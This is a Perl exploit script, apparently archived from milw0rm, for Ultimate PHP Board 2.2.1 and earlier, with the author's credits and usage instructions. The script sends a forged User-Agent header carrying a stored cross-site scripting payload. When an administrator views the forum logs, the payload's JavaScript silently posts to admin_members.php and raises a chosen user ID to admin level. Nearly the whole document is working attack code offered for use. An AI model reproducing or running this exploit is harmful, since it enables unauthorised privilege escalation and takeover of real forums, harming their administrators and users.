<html><head><title>Ultimate PHP Board <= 2.2.1 (log inj) Privilege Escalation Exploit</title></head><pre>#!/usr/bin/perl -w
# ------------------------------------------------------------------
# Ultimate PHP Board &lt;= 2.2.1 (log inj) Privilege Escalation Exploit
# ------------------------------------------------------------------
# by athos - staker[at]hotmail[dot]it
# download on http://www.myupb.com/
# ------------------------------------------------------------------
# Usage:
# perl xpl.pl host path id email
# perl xpl.pl localhost/upb 21 root@r00x.com
# ------------------------------------------------------------------
# Note: don't add me on msn messenger
#       thanks evilsocket 
#       thanks meh for ajax code
#       my email staker.38@gmail.com
# ------------------------------------------------------------------

use strict;
use IO::Socket;

my ($host,$path,$id,$email) = @ARGV;


if (@ARGV != 4) {
      
      print &quot;\n+--------------------------------------------------------------------+\r&quot;.
            &quot;\n| Ultimate PHP Board &lt;= 2.2.1 (log inj) Privilege Escalation Exploit |\r&quot;.
            &quot;\n+--------------------------------------------------------------------+\r&quot;.
            &quot;\n(user -&gt; admin xpl )by athos - staker[at]hotmail[dot]it\n&quot;.
            &quot;\nUsage   + perl $0 [host] [path] [ID] [email]&quot;.
            &quot;\nHost    + localhost&quot;.
            &quot;\nPath    + forum path /upb)&quot;.
            &quot;\nID      + your user ID&quot;.
            &quot;\nEmail   + your/any email\n&quot;;
      exit;
} 

&amp;exploit();


sub exploit () {

     my $content = undef;
     my $uagent  = &amp;logs;
     my $packet  = undef;
     my $socket  = new IO::Socket::INET(
                                         PeerAddr =&gt; $host,
                                         PeerPort =&gt; 80,
                                         Proto    =&gt; 'tcp',
                                       ) or die $!;
                            
     $packet .= &quot;GET /$path/index.php HTTP/1.1\r\n&quot;;
     $packet .= &quot;Host: $host\r\n&quot;;
     $packet .= &quot;User-Agent: $uagent\r\n&quot;;
     $packet .= &quot;Connection: close\r\n\r\n&quot;;
     
     $socket-&gt;send($packet);
     
     while (&lt;$socket&gt;) {
        $content .= $_;
     }    
     
     if ($content =~ m/myUPB/i) {
        print &quot;Exploit Done!\n&quot;;
        print &quot;You'll become admin when the real admin will visit the logs\n&quot;;
        exit;
     }
     else {
        print &quot;Exploit Failed!\n&quot;;
        exit;
    }    
}                            


sub logs () {

my $logs = &quot;Lynx/2.8.7dev.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8d&quot;.
           &quot;&lt;script&gt;var xplurl='http://$host/$path/admin_members.php?a&quot;.
           &quot;ction=edit&amp;id=$id&amp;page=10'; var xpldata='a=1&amp;level=3&amp;email&quot;.
           &quot;=$email&amp;status&amp;location&amp;website&amp;avatar&amp;msn&amp;yahoo&amp;icq&amp;sig&amp;u_&quot;.
           &quot;timezone=0&amp;B1=Submit';function s(s){var h=((window.ActiveXO&quot;.
           &quot;bject)?new ActiveXObject('Microsoft.XMLHTTP'):new XMLHttp&quot;.
           &quot;Request());h.open('POST', xplurl, true);h.setRequestHeader&quot;.
           &quot;('Content-type','application/x-www-form-urlencoded');h.setRe&quot;.
           &quot;questHeader('Content-length',xpldata.length);h.setRequestHea&quot;.
           &quot;der('Connection','close');h.send(xpldata);}s();&lt;/script&gt;&quot;;
  
  return $logs;
           
}                     

# milw0rm.com [2008-12-29]</pre></html>